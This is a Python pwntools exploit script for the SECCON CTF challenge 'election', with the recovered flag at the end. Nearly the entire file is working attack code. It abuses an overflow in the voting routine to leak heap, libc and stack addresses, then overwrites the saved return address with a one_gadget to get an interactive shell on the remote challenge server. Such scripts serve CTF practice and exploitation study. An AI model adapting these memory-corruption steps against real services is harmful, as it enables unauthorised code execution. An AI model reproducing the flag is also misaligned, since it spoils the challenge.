#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
    libc = ELF('libc-2.23.so')
else:
    DEBUG = True
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

b = ELF('election')
context.log_level = 'info'
context.os = 'linux'
context.bits = 64
context.arch = 'amd64'
context.endian = 'little'

###

if DEBUG:
    r = process('./election')
else:
    r = remote('election.pwn.seccon.jp', 28349)

def menu():
    global r
    return r.recvuntil('>> ')

def vote(candidat, bonus = '\n', show = False):
    global r
    if show:
        show = 'y'
    else:
        show = 'n'
    r.sendline('2')
    r.sendlineafter('Show candidates? (Y/n) ', show)
    if show:
        d = r.recvuntil('Enter the name of the candidate.\n>> ')
    r.sendline(candidat)
    if candidat == 'oshima':
        r.recvuntil('and re-vote?\n>> ')
        r.send(bonus)
    return d, menu()

def stand(name):
    global r
    r.sendline('1')
    r.sendafter('>> ', name)
    return menu()

GDB = False
if GDB and DEBUG:
    gdb.attach(r, '''b *0x4009b2''')

menu()

# leaking heap
# there is an overflow when voting for oshima
# but a null byte is added, we need the heap base for further
# exploitation
# incrementing first ptr in heap to point to struct rather than string
for i in xrange(0x20):
    vote('oshima', 'yes\x00' + '\x00' * 28)
data = vote('toto', show = True)[0]
l = u64(re.findall('\* (.+)', data)[2].ljust(8, '\x00'))
heap = l & ~0xff
log.info('heap leak: %#x' % l)
log.info('heap: %#x' % heap)

# leaking libc
# first changing state to vote has not begun
vote('oshima', 'yes\x00' + '\x00' * 28 + p64(b.symbols['lv'] - 0x10) + p8(-1, signed = True))
# now adding name to leak got.malloc
stand(p64(b.got['malloc']))
vote('oshima', 'yes\x00' + '\x00' * 28 + p64(heap + 0x48) + p8(0x70))
vote('oshima', 'yes\x00' + '\x00' * 28 + p64(heap + 0x48) + p8(0x70))
# leaking now
data = vote('toto', show = True)[0]
l = u64(re.findall('\* (.+)', data)[3].ljust(8, '\x00'))
libcbase = l - libc.symbols['malloc']
log.info('leak: %#x' % l)
log.info('libcbase: %#x' % libcbase)

# now leaking env address
vote('oshima', 'yes\x00' + '\x00' * 28 + p64(b.symbols['lv'] - 0x10) + p8(-1, signed = True))
log.info('debug environ: %#x' % (libcbase + libc.symbols['environ']))
stand(p64(libcbase + libc.symbols['environ']))
vote('oshima', 'yes\x00' + '\x00' * 28 + p64(heap + 0x48) + p8(0x40))
data = vote('toto', show = True)[0]
l = u64(re.findall('\* (.+)', data)[4].ljust(8, '\x00'))
RIP = l - 0xf0
log.info('leak: %#x' % l)
log.info('RIP: %#x' % RIP)

# using one_gadget to ROP at the exit of main
if DEBUG:
    gadget = libcbase + 0x3f2d6 # condition rax = 0
    actualRIP = libcbase + 0x202b1
else:
    gadget = libcbase + 0x45216 # condition rax = 0
    actualRIP = libcbase + 0x20830

# Now writing the one_gadget on RIP
for i in xrange(6):
    val = (gadget & (0xff << (i * 8))) - ((actualRIP & (0xff << (i * 8)))) >> (i * 8)
    if val == 0:
        RIP += 1
        continue
    vote('oshima', 'yes\x00' + '\x00' * 28 + p64(RIP - 0x10) + p8(val, signed = True))
    RIP += 1

r.sendline('0') # triggering exploit
r.recvuntil('Thank you!!')

r.interactive()
r.close()

# SECCON{I5_7h15_4_fr4ud_3l3c710n?}
